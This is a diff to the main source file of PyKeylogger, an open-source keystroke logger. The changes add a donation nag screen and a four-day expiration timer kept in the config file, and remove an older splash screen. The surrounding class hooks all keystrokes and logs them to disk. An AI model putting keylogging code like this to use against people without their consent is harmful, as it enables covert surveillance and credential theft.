@@ -2,7 +2,7 @@ import pyHook
 import time
 import pythoncom
 import sys
-import imp
+import imp # don't need this anymore?
 from optparse import OptionParser
 import traceback
 from logwriter import LogWriter
@@ -11,8 +11,9 @@ import version
 from configobj import ConfigObj
 from validate import Validator
 from controlpanel import PyKeyloggerControlPanel
-from supportscreen import SupportScreen
+from supportscreen import SupportScreen, ExpirationScreen
 import Tkinter, tkMessageBox
+import myutils
 
 class KeyLogger:
     ''' Captures all keystrokes, calls LogWriter class to log them to disk
@@ -21,6 +22,7 @@ class KeyLogger:
         
         self.ParseOptions()
         self.ParseConfigFile()
+        self.NagscreenLogic()
         self.hm = pyHook.HookManager()
         self.hm.KeyDown = self.OnKeyboardEvent
     
@@ -79,15 +81,7 @@ class KeyLogger:
         
         Give detailed error box and exit if validation on the config file fails.
         '''
-        #~ self.config = ConfigParser.SafeConfigParser()
-        #~ self.config.readfp(open(self.options.configfile))
-        
-        #~ self.settings = dict(self.config.items('general'))
-        #~ self.settings.update(dict(self.config.items('email')))
-        #~ self.settings.update(dict(self.config.items('logmaintenance')))
-        #~ self.settings.update(dict(self.config.items('timestamp')))
-        #~ self.settings.update(dict(self.config.items('zip')))
-        #~ self.settings.update(self.options.__dict__) # add commandline options to our settings dict
+
         self.settings=ConfigObj(self.cmdoptions.configfile, configspec=self.cmdoptions.configval, list_values=False)
 
         # validate the config file
@@ -104,21 +98,42 @@ class KeyLogger:
             tkMessageBox.showerror("Errors in config file. Exiting.", errortext)
             sys.exit()
         
+    def NagscreenLogic(self):
+        '''Figure out whether the nagscreen should be shown, and if so, show it.
+        '''
+        
+        # Congratulations, you have found the nag control. See, that wasn't so hard, was it? :)
+        # 
+        # While I have deliberately made it easy to stop all this nagging and expiration stuff here,
+        # and you are quite entitled to doing just that, I would like to take this final moment 
+        # and encourage you once more to support the PyKeylogger project by making a donation. 
+        
+        # Set this to False to get rid of all nagging.
+        NagMe = True
+        
+        if NagMe == True:
+            # first, show the support screen
+            root=Tkinter.Tk()
+            root.geometry("100x100+200+200")
+            warn=SupportScreen(root, title="Please Support PyKeylogger", rootx_offset=-20, rooty_offset=-35)
+            root.destroy()
+            del(warn)
+            
+            #set the timer if first use
+            if myutils.password_recover(self.settings['General']['Usage Time Flag NoDisplay']) == "firstuse":
+                self.settings['General']['Usage Time Flag NoDisplay'] = myutils.password_obfuscate(str(time.time()))
+                self.settings.write()
+            
+            # then, see if we have "expired"
+            if abs(time.time() - float(myutils.password_recover(self.settings['General']['Usage Time Flag NoDisplay']))) > 345600: #4 days
+                root = Tkinter.Tk()
+                root.geometry("100x100+200+200")
+                warn=ExpirationScreen(root, title="PyKeylogger Has Expired", rootx_offset=-20, rooty_offset=-35)
+                root.destroy()
+                del(warn)
+                sys.exit()
+                
 if __name__ == '__main__':
-    def main_is_frozen():
-        return (hasattr(sys, "frozen") or # new py2exe
-                hasattr(sys, "importers") or # old py2exe
-                imp.is_frozen("__main__")) # tools/freeze
-    
-    # Set this to False to get rid of the splash. 
-    show_splash = True
-    
-    if main_is_frozen() and show_splash == True: #comment out this if statement block to remove support request
-        root=Tkinter.Tk()
-        root.geometry("100x100+200+200")
-        warn=SupportScreen(root, title="Please Support PyKeylogger", rootx_offset=-20, rooty_offset=-35)
-        root.destroy()
-        del(warn)
     
     kl = KeyLogger()
     kl.start()
